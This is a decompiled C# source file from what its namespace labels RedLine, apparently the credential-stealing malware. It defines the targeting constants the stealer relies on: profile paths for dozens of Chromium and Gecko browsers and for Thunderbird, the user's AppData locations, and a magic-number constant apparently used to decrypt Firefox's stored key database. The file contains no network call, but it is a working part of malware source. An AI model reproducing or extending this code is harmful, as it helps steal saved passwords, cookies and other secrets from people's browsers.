using System;
using System.Collections.Generic;
using System.IO;

namespace RedLine.Logic.Helpers
{
	// Token: 0x02000060 RID: 96
	public static class Constants
	{
		// Token: 0x060002A9 RID: 681 RVA: 0x0000B708 File Offset: 0x00009908
		static Constants()
		{
			Constants.chromiumBrowserPaths.Add("\\Chromium\\User Data");
			Constants.chromiumBrowserPaths.Add("\\Google\\Chrome\\User Data");
			Constants.chromiumBrowserPaths.Add("\\Google(x86)\\Chrome\\User Data");
			Constants.chromiumBrowserPaths.Add("\\Opera Software\\");
			Constants.chromiumBrowserPaths.Add("\\MapleStudio\\ChromePlus\\User Data");
			Constants.chromiumBrowserPaths.Add("\\Iridium\\User Data");
			Constants.chromiumBrowserPaths.Add("\\7Star\\7Star\\User Data");
			Constants.chromiumBrowserPaths.Add("\\CentBrowser\\User Data");
			Constants.chromiumBrowserPaths.Add("\\Chedot\\User Data");
			Constants.chromiumBrowserPaths.Add("\\Vivaldi\\User Data");
			Constants.chromiumBrowserPaths.Add("\\Kometa\\User Data");
			Constants.chromiumBrowserPaths.Add("\\Elements Browser\\User Data");
			Constants.chromiumBrowserPaths.Add("\\Epic Privacy Browser\\User Data");
			Constants.chromiumBrowserPaths.Add("\\uCozMedia\\Uran\\User Data");
			Constants.chromiumBrowserPaths.Add("\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer");
			Constants.chromiumBrowserPaths.Add("\\CatalinaGroup\\Citrio\\User Data");
			Constants.chromiumBrowserPaths.Add("\\Coowon\\Coowon\\User Data");
			Constants.chromiumBrowserPaths.Add("\\liebao\\User Data");
			Constants.chromiumBrowserPaths.Add("\\QIP Surf\\User Data");
			Constants.chromiumBrowserPaths.Add("\\Orbitum\\User Data");
			Constants.chromiumBrowserPaths.Add("\\Comodo\\Dragon\\User Data");
			Constants.chromiumBrowserPaths.Add("\\Amigo\\User\\User Data");
			Constants.chromiumBrowserPaths.Add("\\Torch\\User Data");
			Constants.chromiumBrowserPaths.Add("\\Yandex\\YandexBrowser\\User Data");
			Constants.chromiumBrowserPaths.Add("\\Comodo\\User Data");
			Constants.chromiumBrowserPaths.Add("\\360Browser\\Browser\\User Data");
			Constants.chromiumBrowserPaths.Add("\\Maxthon3\\User Data");
			Constants.chromiumBrowserPaths.Add("\\K-Melon\\User Data");
			Constants.chromiumBrowserPaths.Add("\\Sputnik\\Sputnik\\User Data");
			Constants.chromiumBrowserPaths.Add("\\Nichrome\\User Data");
			Constants.chromiumBrowserPaths.Add("\\CocCoc\\Browser\\User Data");
			Constants.chromiumBrowserPaths.Add("\\Uran\\User Data");
			Constants.chromiumBrowserPaths.Add("\\Chromodo\\User Data");
			Constants.chromiumBrowserPaths.Add("\\Mail.Ru\\Atom\\User Data");
			Constants.chromiumBrowserPaths.Add("\\BraveSoftware\\Brave-Browser\\User Data");
			Constants.chromiumBrowserPaths.Add("\\Microsoft\\Edge\\User Data");
			Constants.geckoBrowserPaths.Add("\\Mozilla\\Firefox");
			Constants.geckoBrowserPaths.Add("\\Waterfox");
			Constants.geckoBrowserPaths.Add("\\K-Meleon");
			Constants.geckoBrowserPaths.Add("\\Thunderbird");
			Constants.geckoBrowserPaths.Add("\\Comodo\\IceDragon");
			Constants.geckoBrowserPaths.Add("\\8pecxstudios\\Cyberfox");
			Constants.geckoBrowserPaths.Add("\\NETGATE Technologies\\BlackHaw");
			Constants.geckoBrowserPaths.Add("\\Moonchild Productions\\Pale Moon");
		}

		// Token: 0x04000143 RID: 323
		public static readonly byte[] Key4MagicNumber = new byte[]
		{
			248,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			1
		};

		// Token: 0x04000144 RID: 324
		public static readonly string LocalAppData = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Local");

		// Token: 0x04000145 RID: 325
		public static readonly string RoamingAppData = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Roaming");

		// Token: 0x04000146 RID: 326
		public static List<string> chromiumBrowserPaths = new List<string>();

		// Token: 0x04000147 RID: 327
		public static List<string> geckoBrowserPaths = new List<string>();
	}
}
